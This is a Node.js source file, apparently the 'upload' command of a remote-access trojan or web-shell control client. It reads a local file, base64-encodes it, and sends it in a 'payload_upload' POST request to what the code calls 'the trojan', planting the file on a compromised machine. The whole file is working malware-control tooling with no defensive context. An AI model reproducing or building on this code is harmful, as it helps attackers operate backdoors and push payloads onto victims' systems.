const errors     = require('./util-http-error');
const fs         = require('fs');
const path       = require('path');
const shellwords = require('shellwords');

module.exports = function(config, req, cmd, callback) {

  // tokenize the input string
  const tokenized = shellwords.split(cmd);
  const src       = tokenized[1] || '';
  const dst       = tokenized[2] || path.basename(src);

  // assert that src was provided
  if (src === '') {

    // assemble an error message
    var err = [
      'Specify a file to upload.',
      'Usage: upload <local-filename> [<remote-filename>]'
    ].join('\n');

    return callback(new Error(err));
  }

  // read the file data
  var data;
  try {
    data = new Buffer(fs.readFileSync(src)).toString('base64');
  } catch (e) {
    return callback(new Error([ 'Cannot upload file.', e ].join('\n')));
  }

  // initialize the POST body
  const body = {
    cmd : 'payload_upload',
    args : {
      dst  : dst,
      data : data,
    },
  };

  // POST to the trojan
  req.post({ body : body }, function(err, obj, response) {

    if (obj.statusCode !== 200) {
      return callback(errors(config, obj.statusCode));
    }

    callback(err, response);
  });
};
